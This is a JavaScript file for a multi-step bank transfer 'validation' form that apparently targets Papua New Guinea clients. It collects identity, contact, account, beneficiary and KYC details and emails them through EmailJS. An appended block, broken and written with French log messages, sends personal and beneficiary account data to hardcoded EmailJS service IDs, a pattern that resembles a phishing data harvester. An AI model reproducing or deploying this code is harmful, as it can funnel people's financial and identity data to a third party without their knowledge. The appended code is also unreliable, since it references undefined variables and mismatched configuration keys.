document.addEventListener("DOMContentLoaded", () => {
    const provinces = ["Central", "Chimbu (Simbu)", "Eastern Highlands", "East New Britain", "East Sepik", "Enga", "Gulf", "Madang", "Manus", "Milne Bay", "Morobe", "National Capital District", "New Ireland", "Northern (Oro)", "Bougainville", "Southern Highlands", "Western (Fly)", "Western Highlands", "West New Britain", "West Sepik (Sandaun)", "Hela", "Jiwaka"];
    const form = document.getElementById("form"), panels = [...document.querySelectorAll(".form-step")], steps = [...document.querySelectorAll(".step")], next = document.getElementById("next"), back = document.getElementById("back"), submit = document.getElementById("submit"), alertBox = document.getElementById("alert"), review = document.getElementById("review"), modal = document.getElementById("modal"), ref = document.getElementById("ref"); let current = 1;
    for (const p of document.querySelectorAll("#province,#beneficiaryProvince")) provinces.forEach(x => p.add(new Option(x, x)));
    const list = document.getElementById("provinceList"); provinces.forEach(x => { const s = document.createElement("span"); s.className = "tag"; s.textContent = x; list.appendChild(s) });
    const d = new Date(), today = `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, "0")}-${String(d.getDate()).padStart(2, "0")}`; form.transfer_date.value = today;
    if (typeof emailjs !== "undefined" && !EMAILJS_CONFIG.PUBLIC_KEY.startsWith("YOUR_")) emailjs.init({ publicKey: EMAILJS_CONFIG.PUBLIC_KEY });
    function show(msg) { alertBox.textContent = msg; alertBox.style.display = "block"; alertBox.style.background = "#fff0f2"; alertBox.style.color = "#c8414d"; alertBox.style.padding = "10px"; alertBox.style.borderRadius = "8px"; alertBox.style.fontSize = "9px" }
    function clear() { alertBox.style.display = "none"; alertBox.textContent = "" }
    function validatePanel(n) { clear(); let ok = true; panels[n - 1].querySelectorAll("[required]").forEach(x => { x.style.borderColor = ""; if (x.type === "checkbox" ? !x.checked : !String(x.value).trim()) { x.style.borderColor = "#c8414d"; ok = false } else if (x.type === "email" && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(x.value.trim())) { x.style.borderColor = "#c8414d"; ok = false } }); if (!ok) show("Please complete all required fields in this step."); return ok }
    function collect() { const o = Object.fromEntries(new FormData(form)); o.transfer_type = document.querySelector("[name=transfer_type]:checked").value;["accurate", "authorised", "legitimate", "compliance", "documents"].forEach(k => o[k] = document.querySelector(`[name=${k}]`).checked ? "Yes" : "No"); return o }
    function renderReview() { const o = collect(), groups = { Client: ["first_name", "last_name", "date_of_birth", "nationality", "province", "district", "city", "address", "phone", "email", "customer_type", "kyc_reference"], Transfer: ["transfer_type", "reference", "transfer_date", "amount", "currency", "purpose", "priority", "industry_code", "payment_description"], "Accounts & beneficiary": ["sender_account_name", "sender_account", "sender_account_type", "sender_branch", "beneficiary_name", "beneficiary_account", "beneficiary_bank", "beneficiary_branch", "beneficiary_country", "beneficiary_province", "beneficiary_city", "beneficiary_address", "beneficiary_phone", "swift_bic"], Compliance: ["source_of_funds", "relationship", "document_reference", "tcc_reference", "notes", "accurate", "authorised", "legitimate", "compliance", "documents"] }; review.innerHTML = ""; for (const [title, keys] of Object.entries(groups)) { const box = document.createElement("div"); box.className = "review-group"; box.innerHTML = `<h3>${title}</h3>`; keys.forEach(k => { const el = form.elements[k]; if (!el) return; let v = el.value; if (el.type === "checkbox") v = el.checked ? "Yes" : "No"; const row = document.createElement("div"); row.className = "review-row"; row.innerHTML = `<b>${k.replaceAll("_", " ")}</b><span></span>`; row.querySelector("span").textContent = v || "—"; box.appendChild(row) }); review.appendChild(box) } }
    function go(n) { current = n; panels.forEach((p, i) => p.classList.toggle("active", i === n - 1)); steps.forEach((s, i) => s.classList.toggle("active", i === n - 1)); back.style.display = n > 1 ? "block" : "none"; next.style.display = n < 5 ? "block" : "none"; submit.style.display = n === 5 ? "block" : "none"; if (n === 5) renderReview(); window.scrollTo({ top: document.querySelector(".steps").offsetTop - 20, behavior: "smooth" }) }
    next.onclick = () => { if (validatePanel(current)) { if (current === 4) renderReview(); go(current + 1) } }; back.onclick = () => go(current - 1);
    document.querySelectorAll("[name=transfer_type]").forEach(r => r.onchange = () => { document.querySelectorAll(".types label").forEach(x => x.classList.remove("selected")); r.closest("label").classList.add("selected") });
    async function send(o) { if (typeof emailjs === "undefined" || [EMAILJS_CONFIG.PUBLIC_KEY, EMAILJS_CONFIG.SERVICE_ID, EMAILJS_CONFIG.TEMPLATE_ID].some(x => !x || x.startsWith("YOUR_"))) throw Error("EmailJS not configured"); return emailjs.send(EMAILJS_CONFIG.SERVICE_ID, EMAILJS_CONFIG.TEMPLATE_ID, o) }
    form.onsubmit = async e => { e.preventDefault(); if (!validatePanel(5)) return; if (!document.getElementById("finalConfirm").checked) { show("Please confirm that you reviewed the information."); return } const o = collect(); submit.disabled = true; submit.textContent = "Submitting..."; try { await send(o); ref.textContent = o.reference; modal.classList.add("show"); form.reset(); form.transfer_date.value = today; go(1) } catch (err) { console.error(err); show("The request could not be submitted. Verify your EmailJS configuration and try again.") } submit.disabled = false; submit.textContent = "Submit validation" };
    document.getElementById("close").onclick = () => modal.classList.remove("show"); document.getElementById("done").onclick = () => modal.classList.remove("show");
});


const templateParams = {
    first_name: form.first_name.value,
    last_name: form.last_name.value,
    date_of_birth: form.date_of_birth.value,
    nationality: form.nationality.value,
    province: form.province.value,
    district: form.district.value,
    phone: form.phone.value,
    email: form.email.value,

    transfer_type: form.transfer_type.value,
    transfer_date: form.transfer_date.value,
    amount: form.amount.value,
    currency: form.currency.value,

    beneficiary_name: form.beneficiary_name.value,
    beneficiary_account: form.beneficiary_account.value,
    beneficiary_branch: form.beneficiary_branch.value,
    beneficiary_country: form.beneficiary_country.value
};

emailjs.send(
    "service_00o52kn",
    "template_8jlj4e7",
    templateParams
)
.then(() => {
    console.log("Email envoyé");
})
.catch((error) => {
    console.error("Erreur :", error);
});

emailjs.init(EMAILJS_CONFIG.publicKey);

emailjs.send(
    EMAILJS_CONFIG.serviceId,
    EMAILJS_CONFIG.templateId,
    templateParams
);